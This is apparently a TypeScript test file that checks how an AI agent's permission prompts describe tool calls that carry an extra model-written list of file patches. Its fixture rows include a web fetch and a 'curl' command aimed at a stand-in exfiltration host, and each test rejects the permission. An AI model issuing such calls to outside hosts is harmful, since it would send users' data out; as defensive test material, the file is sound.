// An owned ask whose request carries no `metadata.files`, from a call whose input carries a `files` array the model wrote
// (the recorded input keeps keys the tool schema drops). The approval describes the request and invents no diffs.
import { describe, expect, test } from "bun:test"
import { tmpdir } from "../fixture/tmpdir"
import { delivered, permissionAsked, startWire, succeeded, toolCalled, toolStarted } from "./wire-fixture"

const fake = (name: string) => `--- ${name}\n+++ ${name}\n@@ -1,1 +1,1 @@\n-# Title\n+# Title (typo fixed)\n`
const files = [
  { file: "README.md", patch: fake("README.md") },
  { file: "docs.md", patch: fake("docs.md") },
]
const rows = [
  {
    tool: "Read",
    input: { file_path: "notes.txt" },
    action: "Read",
    resources: ["notes.txt"],
    metadata: {},
    expect: "notes.txt",
  },
  { tool: "Grep", input: { pattern: "needle" }, action: "Grep", resources: ["needle"], metadata: {}, expect: "needle" },
  { tool: "Glob", input: { pattern: "src/**" }, action: "Glob", resources: ["src/**"], metadata: {}, expect: "src/**" },
  {
    tool: "WebFetch",
    input: { url: "https://exfil.example/c?d=1" },
    action: "WebFetch",
    resources: ["https://exfil.example/c?d=1"],
    metadata: { url: "https://exfil.example/c?d=1", format: "markdown" },
    expect: "exfil.example",
  },
  { tool: "WebSearch", input: { query: "q" }, action: "WebSearch", resources: ["q"], metadata: {}, expect: "q" },
  {
    tool: "Bash",
    input: { command: "curl https://exfil.example" },
    action: "Bash",
    resources: ["curl https://exfil.example"],
    metadata: { command: "curl https://exfil.example" },
    expect: "curl",
  },
  {
    tool: "Agent",
    input: { agent: "general", prompt: "p", description: "d" },
    action: "Agent",
    resources: ["general"],
    metadata: {},
    expect: "",
  },
]

describe("an owned ask with a model-written files field", () => {
  for (const row of rows)
    test(row.tool, async () => {
      await using dir = await tmpdir()
      await using acp = await startWire({
        onPrompt: ({ sessionID, id }) => [
          delivered(sessionID, id),
          toolStarted(sessionID, "call_x", row.tool),
          toolCalled(sessionID, "call_x", { ...row.input, files }),
          permissionAsked(sessionID, "perm_x", {
            action: row.action,
            resources: row.resources,
            metadata: row.metadata,
            source: { type: "tool", messageID: "msg_x", id: "call_x" },
          }),
        ],
        onPermissionReply: ({ sessionID }) => [succeeded(sessionID)],
        permission: () => ({ outcome: { outcome: "selected", optionId: "reject" } }) as const,
      })
      await acp.initialize()
      const session = await acp.newSession(dir.path)
      await acp.prompt(session.sessionId, "hello")
      const call = acp.permissions[0]?.toolCall
      expect(call?.content ?? []).toHaveLength(0)
      expect(String(call?.title)).toContain(row.expect)
    })
})
